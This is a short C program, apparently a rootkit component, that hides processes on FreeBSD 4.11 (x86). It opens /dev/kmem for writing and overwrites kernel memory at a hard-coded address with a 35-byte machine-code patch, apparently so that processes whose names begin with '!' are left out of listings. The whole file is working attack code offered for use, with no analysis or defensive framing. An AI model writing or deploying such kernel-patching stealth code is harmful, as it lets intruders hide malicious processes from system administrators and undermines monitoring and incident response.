// FreeBSD 4.11-Release (x86) process hider by defaced staff

#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

#define OFFSET  0xc023a7e3
#define SIZE    35

 char clip_code[] =
 "\x75\x13" // new offset
 "\x53"
 "\xff\x35\x10\x8b\x48\xc0"

 "\xe8\x2f\x0c\x00\x00"
 "\x83\xc4\x08"
 "\x85\xc0"
 "\x75\x09" // also new

 // clip_code  FreeBSD 4.11 (x86) 13 bytes satanic power
 "\x8b\x53\x10"
 "\x80\x7a\x0c\x21"
 "\x75\x05"
 "\x39\xd2"
 "\xeb\x2a"
 "\x90";


int main()
{
  int fd;
  
  fd = open("/dev/kmem", O_WRONLY);
  if (fd < 0) return 0;

  if (lseek(fd, OFFSET, 0) < 0) return 0;
  write(fd, &clip_code, SIZE);
  close(fd);

  printf("done\n");
  return 0;
}